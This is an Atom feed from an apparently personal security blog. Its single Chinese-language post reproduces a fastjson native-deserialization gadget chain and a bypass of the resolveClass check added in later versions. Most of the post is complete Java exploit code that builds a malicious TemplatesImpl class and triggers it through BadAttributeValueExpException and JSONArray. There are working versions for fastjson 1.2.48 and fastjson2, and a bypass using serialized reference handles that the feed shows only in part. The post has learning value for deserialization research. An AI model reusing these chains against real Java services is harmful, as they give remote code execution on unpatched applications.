<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>clown</title>
  
  <subtitle>clown的站点</subtitle>
  <link href="https://clowsman.github.io/atom.xml" rel="self"/>
  
  <link href="https://clowsman.github.io/"/>
  <updated>2024-10-11T09:21:33.257Z</updated>
  <id>https://clowsman.github.io/</id>
  
  <author>
    <name>clown</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>fastjson原生反序列化</title>
    <link href="https://clowsman.github.io/2024/10/11/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/11/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-11T04:15:15.000Z</published>
    <updated>2024-10-11T09:21:33.257Z</updated>
    
    <content type="html"><![CDATA[<p>看了fastjson的各版本链子，再看一下fastjson的原生反序列化，看的是y4师傅的两篇文章</p><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</a></p><p>来简单的学习复现一下</p><h1 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h1><p>Fastjson1版本小于等于1.2.48(不过1.2.49之后也有绕过方法，这里指的是直接用不需要绕过的)</p><p>Fastjson2&lt;&#x3D;2.0.26(我自己测试刚好在文章版本的下一个版本2.0.27开始就不行了)</p><h1 id="找链子"><a href="#找链子" class="headerlink" title="找链子"></a>找链子</h1><p>要用原生反序列化，就需要寻找fastjson中继承了Serializable接口的类，fastjson里面有两个这样的类：JSONArray与JSONObject</p><p>这两个类的利用方式差不多，这里用JSONArray这个类</p><p>这两个本身是没有实现readObject方法的，所以是通过其他类的readObject来触发JSONArray与JSONObject中的某个方法来形成链子。</p><p>文章中的就是利用JSON的toString方法触发JSON的toJsonString的调用</p><p><img src="https://cdn.clown2024.cn/202410111309567.png" alt="image-20241011130936507"></p><p>这和JSONObject以及JSONArray有什么关系呢，我去看了源码，JSONArray和JSONObject是JSON的子类，他们本身是没有toString方法的，所以会调用到其父类JSON的toString方法</p><p>那为什么要触发toString呢，因为JSONObject和JSONArray在触发toString方法的时候会调用get方法，欸那就可以用来将我们的链子封装在里面来触发了</p><p>get触发例子</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Student构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">// JSONObject调用toString</span><br>        HashMap&lt;String,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;clown&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">org</span>.clown.Test1.Student());<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(hashMap);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> jsonObject.toString();<br>        System.out.println(<span class="hljs-string">&quot;-----------------------&quot;</span>);<br><br>        <span class="hljs-comment">// JSONArray调用toString</span><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>());<br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(arrayList);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string1</span> <span class="hljs-operator">=</span> objects.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111324454.png" alt="image-20241011132452413"></p><p>至于为什么toString会调用getter方法就看文章的分析了解一下就好了</p><h1 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h1><p>能触发getter方法就很容易想到通过触发TemplatesImpl的getOutputProperties方法实现加载任意字节码最终触发恶意方法调用</p><p>然后触发toString方法我们可以利用BadAttributeValueExpException来触发，该类在cc和rome链都有用到</p><p>那么链子我们就可以写出来了，这里用javassist动态生成恶意类</p><p><strong>利用依赖</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.48<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>利用链</strong></p><p>fastjson1的利用</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111336619.png" alt="image-20241011133609518"></p><p>fastjson2利用</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111341193.png" alt="image-20241011134159108"></p><p>JSONObject的利用也一样，就不再写一遍了</p><h1 id="为什么fastjson1249以后不再能利用"><a href="#为什么fastjson1-2-49以后不再能利用" class="headerlink" title="为什么fastjson1.2.49以后不再能利用"></a>为什么fastjson1.2.49以后不再能利用</h1><p>因为从1.2.49开始，JSONArray以及JSONObject方法开始有了自己的readObject方法</p><p><img src="https://cdn.clown2024.cn/202410111346927.png" alt="image-20241011134629872"></p><p>在其<code>SecureObjectInputStream</code>类当中重写了<code>resolveClass</code>,在其中调用了<code>checkAutoType</code>方法做类的检查</p><p><img src="https://cdn.clown2024.cn/202410111350600.png" alt="image-20241011135009543"></p><p>所以后面就是我们如何进行绕过的问题了</p><h1 id="fastjson1249后绕过"><a href="#fastjson1-2-49后绕过" class="headerlink" title="fastjson1.2.49后绕过"></a>fastjson1.2.49后绕过</h1><p>他检查的逻辑是这样的，当调用JSONArray&#x2F;JSONObject的Object方法触发反序列化时，将这个反序列化过程委托给<code>SecureObjectInputStream</code>处理时，触发resolveClass实现对恶意类的拦截</p><p>看起来很正常，但实际上他的反序列化的逻辑是不安全，他是不安全的ObjectInputStream套个安全的SecureObjectInputStream导致了绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectInputStream -&gt; readObject<br>xxxxxx(省略中间过程)<br>SecureObjectInputStream -&gt; readObject -&gt; resolveClass<br></code></pre></td></tr></table></figure><p><strong>安全的反序列化写法</strong></p><p>我们正常的安全反序列化写法应该是这样的，生成一个继承ObjectInputStream的类并重写resolveClass(假定为TestInputStream)，由它来做反序列化的入口，这样才是安全的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TestInputStream -&gt; readObject -&gt; resolveClass<br></code></pre></td></tr></table></figure><p><strong>如何绕过</strong></p><p>那我们的绕过思路就是如果在中间的空档期做一些手脚，让他不进入到resolveClass里面</p><p>关键在ObjectInputStream#readObject0里面，我们看一下</p><p><img src="https://cdn.clown2024.cn/202410111558059.png" alt="image-20241011155830987"></p><p>他会根据读到的bytes中tc的数据类型做不同的处理去恢复部分对象</p><p>在不同的case中，大部分类都会最终调用<code>readClassDesc</code>去获取类的描述符，在这个过程中如果当前反序列化数据下一位仍然是<code>TC_CLASSDESC</code>那么就会在<code>readNonProxyDesc</code>中触发<code>resolveClass</code></p><p><img src="https://cdn.clown2024.cn/202410111611096.png" alt="image-20241011161140045"></p><p><img src="https://cdn.clown2024.cn/202410111611784.png" alt="image-20241011161152724"></p><p>然后分支中，不会调用<code>readClassDesc</code>的分支有<code>TC_NULL</code>、<code>TC_REFERENCE</code>、<code>TC_STRING</code>、<code>TC_LONGSTRING</code>、<code>TC_EXCEPTION</code>，string与null这种对我们毫无用处的，exception类型则是解决序列化终止相关也没什么用，那么就只剩下Reference引用类型了。</p><h2 id="引用类型利用"><a href="#引用类型利用" class="headerlink" title="引用类型利用"></a>引用类型利用</h2><p>我们需要在JSONArray&#x2F;JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型从而绕过resolveClass的检查</p><p>方法就是向List、set、map类型中添加同样对象时即可成功利用</p><p><strong>原理分析</strong></p><p>分析代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(templates);<br>        arrayList.add(templates);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(arrayList);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们写入对象的时候会走到writeObject0这个方法</p><p><img src="https://cdn.clown2024.cn/202410111631619.png" alt="image-20241011163106557"></p><p>这里的注释翻译一下就是处理以前写入且不可替换的对象</p><p>然后走到ArrayList#writeObject</p><p><img src="https://cdn.clown2024.cn/202410111641589.png" alt="image-20241011164111537"></p><p>然后跟进去</p><p><img src="https://cdn.clown2024.cn/202410111641984.png" alt="image-20241011164143924"></p><p>这次传的是TemplatesImpl类，我们第一次写的时候他会在handles哈希表中建立映射</p><p>当我们再次写入的时候，他在查询的时候就不会返回-1</p><p><img src="https://cdn.clown2024.cn/202410111646059.png" alt="image-20241011164654999"></p><p>然后就可以进入到writeHandle方法里面</p><p><img src="https://cdn.clown2024.cn/202410111647745.png" alt="image-20241011164743700"></p><p>可以看到他将重复对象以引用类型写入，这样我们就可以绕过resolveClass的检查了</p><h2 id="利用链构造"><a href="#利用链构造-1" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>文章的简单利用代码思路</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TemplatesImpl templates = TemplatesImplUtil.getEvilClass(&quot;clac&quot;);<br>ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();<br>arrayList.add(templates);<br><br>JSONArray jsonArray = new JSONArray();<br>jsonArray.add(templates);<br><br>BadAttributeValueExpException bd = getBadAttributeValueExpException(jsonArray);<br>arrayList.add(bd);<br>  <br>WriteObjects(arrayList);<br></code></pre></td></tr></table></figure><p>文章的思路解释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">序列化时，在这里templates先加入到arrayList中，后面在JSONArray中再次序列化TemplatesImpl时，由于在handles这个hash表中查到了映射，后续则会以引用形式输出<br><br>反序列化时ArrayList先通过readObject恢复TemplatesImpl对象，之后恢复BadAttributeValueExpException对象，在恢复过程中，由于BadAttributeValueExpException要恢复val对应的JSONArray/JSONObject对象，会触发JSONArray/JSONObject的readObject方法，将这个过程委托给SecureObjectInputStream，在恢复JSONArray/JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过<br><br>Set、Map类型也是这样的绕过<br></code></pre></td></tr></table></figure><p>现在就可以写exp了，改成fastjson1.2.83版本来打</p><p>ArrayList的版本</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> 